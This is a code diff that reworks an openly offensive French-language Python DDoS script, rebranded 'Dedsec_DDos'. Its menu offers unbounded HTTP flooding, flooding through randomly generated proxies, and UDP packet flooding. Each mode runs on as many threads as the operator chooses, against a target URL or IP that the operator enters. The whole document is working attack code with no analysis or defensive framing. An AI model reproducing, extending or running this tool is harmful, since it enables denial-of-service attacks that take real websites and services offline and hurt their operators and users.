@@ -6,116 +6,102 @@ import socket
 import threading
 import random
 import urllib.request
-import itertools
-from colorama import init, Fore, Style
+from colorama import init, Fore
 from pyfiglet import Figlet
 from user_agent import generate_user_agent
 from urllib.request import ProxyHandler, build_opener
 
-# Initialisation colorama
+# Initialiser les couleurs
 init(autoreset=True)
+colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
 
-# Configuration couleurs
-colors = [
-    Fore.RED,
-    Fore.GREEN,
-    Fore.YELLOW,
-    Fore.BLUE,
-    Fore.MAGENTA,
-    Fore.CYAN,
-    Fore.WHITE
-]
-
-def animate_ascii(text, duration=5):
-    """Affiche l'ASCII animé pendant 'duration' secondes."""
+# Animation ASCII
+def animate_ascii(text, duration=3):
     start_time = time.time()
     while time.time() - start_time < duration:
         for color in colors:
-            os.system('clear')
+            os.system('clear' if os.name != 'nt' else 'cls')
             print(color + text)
-            time.sleep(0.2)
+            time.sleep(0.1)
 
-# ASCII Art
-ascii_text = Figlet(font='slant').renderText('Topher_DDos')
+ascii_text = Figlet(font='slant').renderText('Dedsec_DDos')
+animate_ascii(ascii_text)
 
-# Animation en lancement
-animate_ascii(ascii_text, duration=5)
-
-# Couleurs supplémentaires pour prompts
 F = Fore.GREEN
 Z = Fore.RED
 S = Fore.YELLOW
-B = Fore.LIGHTYELLOW_EX
 
-# Demande URL
-url = input(f'{B}ENTREZ L\'URL OU L\'ADRESSE IP CIBLE : ')
-
-# Fonctions d'attaque
-def AttackMahos():
+# Mode 1: Attaque HTTP classique
+def attack_http(url):
     while True:
-        headers = {
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate',
-            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-            'Keep-Alive': '115',
-            'Connection': 'keep-alive',
-            'User-Agent': generate_user_agent()
-        }
+        headers = {'User-Agent': generate_user_agent()}
         try:
-            req = urllib.request.urlopen(
-                urllib.request.Request(url, headers=headers)
-            )
+            req = urllib.request.urlopen(urllib.request.Request(url, headers=headers))
             if req.status == 200:
-                print(f'{F}GOOD Attack: {url}')
+                print(f'{F}[HTTP] Attack OK: {url}')
             else:
-                print(f'{Z}BAD Attack: {url}')
+                print(f'{Z}[HTTP] Fail: {url}')
         except:
-            print(f'{S}DOWN: {url}')
+            print(f'{S}[HTTP] DOWN: {url}')
 
-def ProxyAttack():
+# Mode 2: Attaque via Proxy
+def attack_proxy(url):
     while True:
         ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
-        pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900]
-        port = random.choice(pl)
-        proxy = ip + ":" + str(port)
-        headers = {
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate',
-            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-            'Keep-Alive': '115',
-            'Connection': 'keep-alive',
-            'User-Agent': generate_user_agent()
-        }
+        port = random.choice([80, 443, 8080])
+        proxy = f"{ip}:{port}"
+        headers = {'User-Agent': generate_user_agent()}
         try:
-            proxy_handler = ProxyHandler({'http': 'http://' + proxy})
+            proxy_handler = ProxyHandler({'http': f'http://{proxy}'})
             opener = build_opener(proxy_handler)
             req = opener.open(urllib.request.Request(url, headers=headers))
             if req.status == 200:
-                print(f'{F}GOOD Attack: {url} | Proxy: {proxy}')
+                print(f'{F}[PROXY] OK: {url} | Proxy: {proxy}')
             else:
-                print(f'{Z}BAD Attack: {url} | Proxy: {proxy}')
+                print(f'{Z}[PROXY] Fail: {url} | Proxy: {proxy}')
         except:
-            print(f'{S}DOWN: {url} | Proxy: {proxy}')
+            print(f'{S}[PROXY] DOWN: {url} | Proxy: {proxy}')
 
-# Menu de choix
-def linked():
-    sg = input(
-        f'''
-══════════════════════════════════════════
-{Z}[1] {F}Attaque sans Proxy - Mode Brutal
-══════════════════════════════════════════
-{S}[2] {F}Attaque avec Proxy - Mode Invisible
-══════════════════════════════════════════
-{S}⌯{F} Choisis ton mode de frappe (1 ou 2) {F}» '''
-    )
-    if sg == '1':
-        for _ in range(2000):
-            threading.Thread(target=AttackMahos).start()
-    elif sg == '2':
-        for _ in range(2000):
-            threading.Thread(target=ProxyAttack).start()
+# Mode 3: Attaque UDP
+def attack_udp(ip, port):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes_data = random._urandom(1024)
+    while True:
+        try:
+            sock.sendto(bytes_data, (ip, port))
+            print(f'{F}[UDP] Frappe sur {ip}:{port}')
+        except:
+            print(f'{Z}[UDP] DOWN: {ip}:{port}')
 
-# Démarrer menu
-linked()
+# Menu principal
+def main_menu():
+    print(f"""{Fore.CYAN}
++----------------------------------------+
+|           BY:Mr_Chrxs - MENU           |
++----------------------------------------+
+|             [1] Attaque HTTP           |
+|             [2] Attaque via            |
+|             [3] Attaque UDP            |
++----------------------------------------+
+""")
+    choice = input("Choix (1/2/3): ")
+
+    if choice in ['1', '2']:
+        url = input("Cible URL/IP (ex: http://example.com): ")
+        threads = int(input("Nombre de threads: "))
+        for _ in range(threads):
+            if choice == '1':
+                threading.Thread(target=attack_http, args=(url,)).start()
+            elif choice == '2':
+                threading.Thread(target=attack_proxy, args=(url,)).start()
+    elif choice == '3':
+        ip = input("Adresse IP cible : ")
+        port = int(input("Port (ex: 80, 443) : "))
+        threads = int(input("Nombre de threads: "))
+        for _ in range(threads):
+            threading.Thread(target=attack_udp, args=(ip, port)).start()
+    else:
+        print(f"{Fore.RED}Choix invalide !")
+
+# Lancer le script
+main_menu()
